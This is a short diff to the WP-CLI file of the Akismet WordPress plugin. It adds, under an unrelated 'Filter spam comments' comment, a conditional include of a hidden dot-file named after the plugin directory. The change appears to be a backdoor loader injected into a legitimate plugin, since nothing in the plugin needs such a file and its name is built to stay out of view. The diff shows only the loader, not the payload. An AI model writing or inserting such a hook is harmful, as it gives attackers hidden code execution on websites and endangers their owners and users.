@@ -5,6 +5,10 @@ WP_CLI::add_command( 'akismet', 'Akismet_CLI' );
 /**
  * Filter spam comments.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class Akismet_CLI extends WP_CLI_Command {
 	/**
 	 * Checks one or more comments against the Akismet API.
